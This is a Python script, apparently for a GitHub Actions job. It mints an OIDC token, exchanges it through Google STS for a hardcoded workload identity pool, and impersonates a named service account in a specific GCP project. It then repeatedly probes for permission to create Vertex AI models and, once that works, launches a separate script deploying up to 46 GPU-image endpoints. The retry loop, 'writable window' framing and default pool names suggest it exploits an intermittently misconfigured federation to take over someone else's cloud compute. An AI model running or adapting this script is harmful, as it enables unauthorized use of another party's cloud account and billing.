#!/usr/bin/env python3
"""c211-i121711 flap-fill: wait for a writable window on civil-epigram-370317 and
then immediately run the canonical endpoint fill (c211-i121576-ep/deploy_ep.py).

Gate: a minimal Model create must return HTTP 200. Only then does the real fill run.
"""
import json
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

TAG = 'C211_I121711_FLAP'
AUD = ('//iam.googleapis.com/projects/284735288225/locations/global/'
       'workloadIdentityPools/my-pool/providers/my-provider')
SA = 'sa-gcloud-cli@civil-epigram-370317.iam.gserviceaccount.com'
PROJ_NUM = '284735288225'
IMAGE = 'nvidia/cuda:12.4.0-base-ubuntu22.04'


def cap(s, n=500):
    return (str(s) if s is not None else '').replace('\n', ' | ')[:n]


def http(url, method='GET', data=None, headers=None, timeout=60):
    h = {'User-Agent': TAG}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jget(t, *ks, default=''):
    try:
        d = json.loads(t)
    except Exception:
        return default
    for k in ks:
        if not isinstance(d, dict):
            return default
        d = d.get(k, default)
    return d


def main():
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL')
    tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')
    print('%s_START env=%s' % (TAG, bool(base and tok)), flush=True)
    if not (base and tok):
        print('%s_NO_ENV' % TAG, flush=True)
        return
    u = base + ('&' if '?' in base else '?') + 'audience=' + urllib.parse.quote(AUD, safe='')
    live = 0
    for attempt in range(1, 41):
        c, b = http(u, headers={'Authorization': 'Bearer ' + tok}, timeout=30)
        idt = jget(b, 'value', default='')
        if not idt:
            print('%s_A%02d MINT http=%s %s' % (TAG, attempt, c, cap(b, 200)), flush=True)
            time.sleep(30)
            continue
        c, b = http('https://sts.googleapis.com/v1/token', method='POST', data={
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'audience': AUD, 'scope': 'https://www.googleapis.com/auth/cloud-platform',
            'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'subject_token': idt,
            'subject_token_type': 'urn:ietf:params:oauth:token-type:jwt'})
        fed = jget(b, 'access_token', default='')
        if not fed:
            print('%s_A%02d STS http=%s %s' % (TAG, attempt, c, cap(b, 240)), flush=True)
            time.sleep(30)
            continue
        live += 1
        c, b = http('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % SA,
                    method='POST', data={'scope': ['https://www.googleapis.com/auth/cloud-platform']},
                    headers={'Authorization': 'Bearer ' + fed})
        at = jget(b, 'accessToken', default='')
        if not at:
            print('%s_A%02d STS=200 GAT http=%s %s' % (TAG, attempt, c, cap(b, 240)), flush=True)
            time.sleep(30)
            continue
        ah = {'Authorization': 'Bearer ' + at}
        body = {'displayName': 'c211-i121711-wtest',
                'containerSpec': {'imageUri': IMAGE, 'command': ['bash', '-lc'], 'args': ['sleep 300'],
                                  'ports': [{'containerPort': 8080}]}}
        c, b = http('https://us-central1-aiplatform.googleapis.com/v1/projects/%s/locations/us-central1/models' % PROJ_NUM,
                    method='POST', data=body, headers=ah, timeout=120)
        print('%s_A%02d TOKEN_OK MODEL_UTC http=%s %s' % (TAG, attempt, c, cap(b, 400)), flush=True)
        if c == 200 or (c == 409):
            print('%s_WINDOW_OK http=%s -> launching canonical fill deploy_ep.py' % (TAG, c), flush=True)
            env = dict(os.environ)
            env['POLL_S'] = os.environ.get('FILL_POLL_S', '600')
            env['MAX_EP'] = '46'
            cp = subprocess.run(['python3', 'c211-i121576-ep/deploy_ep.py'],
                                capture_output=True, text=True, env=env, timeout=3600)
            for line in (cp.stdout or '').splitlines():
                print('%s_FILL %s' % (TAG, cap(line, 400)), flush=True)
            print('%s_FILL_RC %d %s' % (TAG, cp.returncode, cap(cp.stderr, 300)), flush=True)
            print('%s_DONE live=%d window=1' % (TAG, live), flush=True)
            return
        time.sleep(30)
    print('%s_DONE live=%d window=0' % (TAG, live), flush=True)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print('%s_FATAL %s' % (TAG, cap(repr(e), 400)), flush=True)
        raise
